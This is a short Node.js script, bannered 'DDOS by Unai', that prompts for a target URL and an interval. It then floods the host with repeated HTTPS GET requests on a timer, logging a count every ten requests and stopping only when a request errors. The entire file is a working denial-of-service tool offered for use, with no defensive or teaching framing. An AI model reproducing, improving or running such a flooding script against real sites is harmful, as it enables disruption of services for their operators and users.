const readline = require("readline");
const rl = readline.createInterface({
	    input: process.stdin,
	    output: process.stdout
});
const https = require("https");
let requests = 0;
let imprimir = 10;
let msg = `
------------------------------
	DDOS by Unai
------------------------------
`
let down = false;
function ddos(url_, intensidad){
	let interval = setInterval(function(){
		var options = {
			hostname: url_,
			method: 'GET'
		}
		const req = https.request(options, res => {
			requests++;
			if(requests === imprimir){
				console.log(`(${imprimir}) Requests send it! Status: ${res.statusCode}`);
	        		imprimir = imprimir + 10;
			}
		})
		req.on('error', error => {
		        console.log("An error ocurred: ");
			console.error(error);
			console.log("An error ocurred, and stoped the atack!")
			return clearInterval(interval);
	        })
		req.end()
	}, intensidad)
}

console.log(msg);
rl.question("Url: ", function(url){
	console.log(`Starting ddos to ${url}`);
	rl.question("Intensidad: ", function(intensidad){
		ddos(url, intensidad);
	})
})
